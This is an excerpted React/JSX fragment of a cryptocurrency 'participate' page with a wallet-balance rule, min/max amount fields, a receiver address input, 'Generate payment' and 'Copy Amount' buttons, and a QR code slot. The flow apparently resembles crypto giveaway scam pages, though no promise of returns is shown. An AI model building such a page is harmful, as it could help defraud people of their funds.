                ...
                <div className="rules">
                    ...
                    <div >
                        <div className="richtext-container list-text">
                            <p>Step1: Make sure you have at least 1 {symbol} or above in your wallet.</p>
            ...
            <div className="calculate">
                    <div className="calculator participateLeft">
                        <div className="calculatorInput formContainer">
                            ...
                            <div className="block">
                                <div className="info">
                                    <div className="header"><img src={ICON} alt="Binance coin" className="icon" width="24" /><span className="name">Binace coin</span></div>
                                </div>
                                <div className="formGroup">
                                    <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">{symbol}</span></label>
                                        <div className="group"><small className="small"> Min: <span>2 {symbol}</span></small><small
                                            className="small"> Max: <span>250 {symbol}</span></small></div>
                                    </div>
                        ...
                        <div className="calculatorInput formContainer">
                            ...
                            <div className="formInput-2 formInput  formInputWithButton">
                                ...
                                <input className="input"
                                    placeholder="receivers wallet address" type="text" /><button onClick={handleApprove} className={approve ? "clicked" : ""}>{approve ? "Generated" : "Generate payment"}</button>
                            </div>
                        </div>
                    </div>
                                ...
                                <div className="formGroup">
                                    ...
                                    <div className="formInput formInputWithButton">
                                        ...
                                        <div className="input"><span className="errorText"> The minimum value allowed is
                                            2 {symbol}</span><span>{symbol}</span></div><button onClick={copyAmount} className="">{value ? "Copied!" : "Copy Amount"}</button>
                                    </div>
                                    <div className="qr"><img className="canvas" width={132} height={132} ></img> </div>
                                </div>
                            </>
                        ) : "" }
                    </div>
